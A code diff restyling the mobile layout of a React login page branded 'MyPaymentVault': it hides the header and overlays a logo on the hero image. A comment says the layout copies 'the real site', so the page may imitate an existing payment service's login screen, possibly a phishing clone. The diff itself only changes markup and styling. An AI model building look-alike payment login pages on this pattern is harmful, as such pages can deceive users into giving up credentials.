@@ -134,16 +134,14 @@ export default function Login() {
             background: #fff !important;
             min-height: 100dvh;
           }
-          .login-card-header {
-            padding: 16px 20px !important;
-          }
-          .login-card-header .lang-btn { display: none !important; }
+          .login-card-header { display: none !important; }
           .login-form-col {
             width: 100% !important;
             padding: 20px 20px 32px !important;
           }
           .login-image-col { display: none !important; }
           .login-hero-mobile { display: block !important; }
+          .login-mobile-logo { display: block !important; }
           .login-footer { display: none !important; }
         }
         /* ── DESKTOP ── */
@@ -494,8 +492,16 @@ export default function Login() {
             className="login-form-col"
             style={{ width: "42%", padding: "44px 20px 28px 34px", background: "transparent", position: "relative", zIndex: 2 }}
           >
-            {/* HERO IMAGE — mobile only */}
-            <div className="login-hero-mobile" style={{ display: "none", lineHeight: 0, margin: "0 -20px 16px", width: "calc(100% + 40px)" }}>
+            {/* HERO IMAGE — mobile only (logo di dalam section gelap seperti real site) */}
+            <div className="login-hero-mobile" style={{ display: "none", lineHeight: 0, margin: "0 -20px 16px", width: "calc(100% + 40px)", position: "relative" }}>
+              {/* Logo overlaid di atas hero image */}
+              <div className="login-mobile-logo" style={{ display: "none", position: "absolute", top: 16, left: 20, zIndex: 10 }}>
+                <span style={{ fontSize: 15, letterSpacing: "0.18em", color: "#fff" }}>
+                  <span style={{ fontWeight: 300 }}>MY</span>
+                  <span style={{ fontWeight: 700 }}>PAYMENT</span>
+                  <span style={{ fontWeight: 300 }}>VAULT</span>
+                </span>
+              </div>
               <img src="/hero-vault-new.png" alt="MyPaymentVault" style={{ width: "100%", display: "block" }} />
             </div>
 
